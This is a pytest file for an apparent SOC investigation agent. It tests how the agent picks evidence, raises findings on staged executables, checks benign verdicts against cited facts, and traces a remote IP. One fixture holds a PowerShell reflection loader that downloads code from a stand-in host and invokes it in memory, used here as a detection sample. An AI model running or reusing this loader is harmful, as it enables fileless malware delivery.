"""SOC V19: deterministic evidence acquisition, causal findings, and submission fidelity."""
import asyncio

from bluesec1_agent.agent import InvestigationMemory, SimpleSGRAgent
from bluesec1_agent.investigation_director import InvestigationDirector
from bluesec1_agent.soc_v19 import SOCV19


def engine():
    return SOCV19(InvestigationDirector())


def memory_with_ps():
    m = InvestigationMemory()
    m.focus_ids = {'ps'}
    m.absorb({'id':'ps','type':'windows_process',
              'properties':{'cmdline':'powershell.exe -NoProfile -File job.ps1'}})
    m.fetched_ids.add('ps')
    return m


def test_forensic_planner_investigates_file_effect_then_payload():
    m = memory_with_ps()
    m.absorb({'id':'edge','type':'wrote_file','source_id':'ps','target_id':'file'})
    m.absorb({'id':'file','type':'windows_file',
              'properties':{'path':'C:\\ProgramData\\DeviceHealth\\launcher.exe'}})
    m.fetched_ids.add('edge')
    lead = engine().next_inspection(m,{'get_entity','get_relation'})
    assert lead is not None
    assert lead.lead.tool == 'get_entity'
    assert lead.lead.arguments['entity_id'] == 'file'
    assert 'file' in lead.lead.arguments['reasoning'].lower() or lead.lead.priority>=9


def test_staged_executable_is_a_finding_not_a_verdict():
    m = memory_with_ps()
    m.absorb({'id':'edge','type':'wrote_file','source_id':'ps','target_id':'file'})
    m.absorb({'id':'file','type':'windows_file',
              'properties':{'path':'C:\\Users\\User\\AppData\\Roaming\\x.dll'}})
    findings = engine().findings(m)
    assert any(f.name == 'executable_artifact_written' and f.severity >= 8 for f in findings)
    assert not any(hasattr(f,'verdict') for f in findings)


def test_benign_falsifier_cannot_be_satisfied_by_actor_only():
    m = memory_with_ps()
    m.absorb({'id':'edge','type':'wrote_file','source_id':'ps','target_id':'file'})
    m.absorb({'id':'file','type':'windows_file',
              'properties':{'path':'C:\\AppData\\Roaming\\x.dll'}})
    sub={'verdict':'benign','reasoning':'Authorized signed Microsoft PowerShell',
         'legitimacy_evidence':[{'anchor':'entity','entity_id':'ps','property_fields':['cmdline']}]}
    gaps = engine().benign_gaps(m,sub)
    assert any('executable_artifact_written' in g or 'wrote_file' in g for g in gaps)


def test_repairs_empty_benign_citations_only_from_opened_facts():
    m = memory_with_ps()
    m.absorb({'id':'edge','type':'wrote_file','source_id':'ps','target_id':'file'})
    m.absorb({'id':'file','type':'windows_file','properties':{'path':'C:\\reports\\report.csv'}})
    sub={'verdict':'benign','legitimacy_evidence':[], 'reasoning':'unspecified'}
    repaired, removed = engine().sanitize(sub,m)
    assert removed == 0
    assert repaired['legitimacy_evidence']
    assert all((e.get('entity_id') or e.get('relation_id')) in m.observed_nodes
               for e in repaired['legitimacy_evidence'])
    assert any(e.get('relation_id')=='edge' for e in repaired['legitimacy_evidence'])


def test_no_hallucinated_graph_ids_or_searches():
    m = memory_with_ps()
    assert engine().next_inspection(m,{'get_relation','search'}) is None
    for _ in range(16):m.calls_made.append('dummy')
    assert engine().next_inspection(m,{'get_entity','get_relation'}) is None


def test_every_retrieved_script_stays_text_not_executed():
    m = memory_with_ps()
    m.absorb({'id':'script','type':'powershell_script','properties':{
        'script_text':'[Reflection.Assembly]::Load($wc.DownloadData("https://example.test"))'
                      '.EntryPoint.Invoke($null, $null)'}})
    m.focus_ids.add('script')
    assert any(f.name=='remote_reflection_loader' for f in engine().findings(m))


def test_v19_full_loop_bypasses_llm_for_first_three_actual_graph_actions():
    from test_v16_loop import FakeSession, FakeLLM
    class CountingLLM(FakeLLM):
        def __init__(self):self.calls=[]
        async def next_step(self,messages,*,finish_only=False):
            self.calls.append(finish_only)
            return await super().next_step(messages,finish_only=finish_only)
    session=FakeSession()
    llm=CountingLLM()
    agent=SimpleSGRAgent(llm,max_steps=12,trajectory_dir=None,
        review_enabled=True,gpt_oss_mode=True,soc_v19_mode=True, v16_mode=False)
    transcript=[]
    result=asyncio.run(agent._investigate(session,transcript))
    assert result.completion_reason=='terminated'
    assert [name for name,_ in session.calls][:3]==['get_entity','get_relation','get_entity']
    assert any('v19_acquisition' in str(m) for m in transcript)
    assert session.calls[-1][0]=='finish_investigation'
    assert llm.calls.count(False) <= 3


def test_grounded_one_time_remote_source_attribution():
    m=memory_with_ps()
    m.absorb({'id':'remote','type':'network_connection',
              'properties':{'src_ip':'192.168.77.13', 'dst_port':445}})
    m.absorb({'id':'net-edge','type':'accepted_connection_from',
              'source_id':'ps','target_id':'remote'})
    m.fetched_ids.update({'remote','net-edge'})
    m.calls_made[:]=['get_entity(ps)','get_relation(net-edge)','get_entity(remote)']
    inspection=engine().next_inspection(m,{'get_relation','search','get_entity'})
    assert inspection and inspection.lead.tool=='search'
    assert inspection.lead.arguments['query']=='192.168.77.13'
    m.calls_made.append('search({"query": "192.168.77.13"})')
    assert engine().next_inspection(m,{'get_relation','search','get_entity'}) is None
